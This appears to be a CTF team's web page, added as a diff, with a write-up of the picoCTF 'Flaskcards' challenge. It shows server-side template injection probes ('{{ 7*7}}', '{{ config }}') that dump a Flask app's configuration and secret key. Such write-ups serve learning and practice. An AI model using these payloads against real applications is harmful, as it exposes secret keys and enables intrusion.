@@ -1,0 +1,109 @@
+<!DOCTYPE html>
+<html>
+
+    <head>
+        <title>  &middot; LiUhack - CTF team at LiU </title>
+
+        <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+<meta name="generator" content="Hugo 0.51" />
+
+
+<script   src="https://code.jquery.com/jquery-3.1.1.min.js"   integrity="sha256-hVVnYaiADRTO2PzUGmuLJr8BLUSjGIZsDYGmIJLv2b8="   crossorigin="anonymous"></script>
+
+
+<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">
+
+<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js" integrity="sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa" crossorigin="anonymous"></script>
+
+
+<link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet" integrity="sha384-wvfXpqpZZVQGK6TAh5PVlGOfQNHSoD2xbE+QkPxCAFlNEevoEH3Sl0sibVcOQVnN" crossorigin="anonymous">
+
+
+<link rel="stylesheet" href="https://liuhack.github.io/css/nix.css">
+
+
+<link href="https://fonts.googleapis.com/css?family=Inconsolata%7COpen+Sans%7CConcert+One" rel="stylesheet">
+
+
+
+
+    </head>
+
+    <body>
+	
+        <header>
+<nav class="navbar navbar-default navbar-fixed-top navbar-inverse font-header">
+	<div class="container-fluid">
+		<div class="navbar-header">
+			<button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#navbar-collapse-1" aria-expanded="false">
+				<span class="sr-only">Toggle navigation</span>
+				<span class="icon-bar"></span>
+				<span class="icon-bar"></span>
+				<span class="icon-bar"></span>
+			</button>
+			<a class="navbar-brand" id="green-terminal" href=https://liuhack.github.io>LiUhack@LiUhack.se ~ $</a>
+		</div>
+
+		
+		<div class="collapse navbar-collapse" id="navbar-collapse-1">
+			<ul class="nav navbar-nav navbar-right">
+				<li>
+					<a href="https://liuhack.github.io">/home/LiUhack</a>
+				</li>
+				
+				
+				<li class="dropdown">
+                    
+            		<a href="https://liuhack.github.io/writeups">~/writeups</a>
+            		
+        		</li>
+        		
+
+			</ul>
+		</div>
+	</div>
+</nav>
+</header>
+
+        <div class="container wrapper">
+            <h1><a href="https://liuhack.github.io/writeups/2018/picoctf/flaskcards/readme/"></a></h1>
+            <span class="post-date">Jan 1, 0001 </span>
+            <div class="post-content">
+                
+
+<h1 id="flaskcards-web">Flaskcards - Web</h1>
+
+<p>We are given a webpage where we first register an account and then we have the ability to create cards and view those created cards. After trying some different input, and thinking about the challenge title we figured out this is a SSTI problem and that Flask is used as backend.</p>
+
+<p>This can be confirmed by entering</p>
+
+<blockquote>
+<p>{{ 7*7}}</p>
+</blockquote>
+
+<p>This gives us 49 so it is executed on the backend. Then we can input
+&gt; {{ config }}</p>
+
+<p>This gives us the following output:</p>
+
+<blockquote>
+<p><Config {'SQLALCHEMY_COMMIT_ON_TEARDOWN': False, 'SQLALCHEMY_TRACK_MODIFICATIONS': False, 'DEBUG': False, 'MAX_COOKIE_SIZE': >4093, &lsquo;TEMPLATES_AUTO_RELOAD&rsquo;: None, &lsquo;PREFERRED_URL_SCHEME&rsquo;: &lsquo;http&rsquo;, &lsquo;SEND_FILE_MAX_AGE_DEFAULT&rsquo;: datetime.timedelta(0, &gt;43200), &lsquo;SESSION_COOKIE_NAME&rsquo;: &lsquo;session&rsquo;, &lsquo;SQLALCHEMY_POOL_RECYCLE&rsquo;: None, &lsquo;SESSION_COOKIE_SAMESITE&rsquo;: None, &gt;&lsquo;TRAP_BAD_REQUEST_ERRORS&rsquo;: None, &lsquo;SECRET_KEY&rsquo;: &lsquo;picoCTF{secret_keys_to_the_kingdom_e8a55760}&lsquo;, &lsquo;JSON_SORT_KEYS&rsquo;: True, &gt;&lsquo;SQLALCHEMY_POOL_SIZE&rsquo;: None, &lsquo;SERVER_NAME&rsquo;: None, &lsquo;SESSION_REFRESH_EACH_REQUEST&rsquo;: True, &lsquo;TESTING&rsquo;: False, &gt;&lsquo;SQLALCHEMY_MAX_OVERFLOW&rsquo;: None, &lsquo;JSON_AS_ASCII&rsquo;: True, &lsquo;USE_X_SENDFILE&rsquo;: False, &lsquo;SQLALCHEMY_BINDS&rsquo;: None, &gt;&lsquo;BOOTSTRAP_QUERYSTRING_REVVING&rsquo;: True, &lsquo;BOOTSTRAP_SERVE_LOCAL&rsquo;: False, &lsquo;PERMANENT_SESSION_LIFETIME&rsquo;: datetime.timedelta(31), &gt;&lsquo;PRESERVE_CONTEXT_ON_EXCEPTION&rsquo;: None, &lsquo;JSONIFY_MIMETYPE&rsquo;: &lsquo;application/json&rsquo;, &lsquo;BOOTSTRAP_LOCAL_SUBDOMAIN&rsquo;: None, &gt;&lsquo;PROPAGATE_EXCEPTIONS&rsquo;: None, &lsquo;APPLICATION_ROOT&rsquo;: &lsquo;/&rsquo;, &lsquo;MAX_CONTENT_LENGTH&rsquo;: None, &lsquo;ENV&rsquo;: &lsquo;production&rsquo;, &gt;&lsquo;EXPLAIN_TEMPLATE_LOADING&rsquo;: False, &lsquo;SESSION_COOKIE_HTTPONLY&rsquo;: True, &lsquo;SQLALCHEMY_NATIVE_UNICODE&rsquo;: None, &gt;&lsquo;SESSION_COOKIE_SECURE&rsquo;: False, &lsquo;SESSION_COOKIE_DOMAIN&rsquo;: False, &lsquo;SQLALCHEMY_DATABASE_URI&rsquo;: &lsquo;sqlite://&lsquo;, &gt;&lsquo;BOOTSTRAP_CDN_FORCE_SSL&rsquo;: False, &lsquo;SQLALCHEMY_ECHO&rsquo;: False, &lsquo;TRAP_HTTP_EXCEPTIONS&rsquo;: False, &lsquo;SQLALCHEMY_POOL_TIMEOUT&rsquo;: None, &gt;&lsquo;BOOTSTRAP_USE_MINIFIED&rsquo;: True, &lsquo;JSONIFY_PRETTYPRINT_REGULAR&rsquo;: False, &lsquo;SQLALCHEMY_RECORD_QUERIES&rsquo;: None, &gt;&lsquo;SESSION_COOKIE_PATH&rsquo;: None}&gt;</p>
+</blockquote>
+
+<p>Boom! We have the flag: picoCTF{secret_keys_to_the_kingdom_e8a55760}</p>
+
+            </div>
+            
+            <div class="post-comments">
+                
+            </div>
+            
+            <div class="push"></div>
+        </div>
+        <footer class="footer text-center">
+<p>Copyright &copy; 2019 LiUhack
+</p>
+</footer>
+
+    </body>
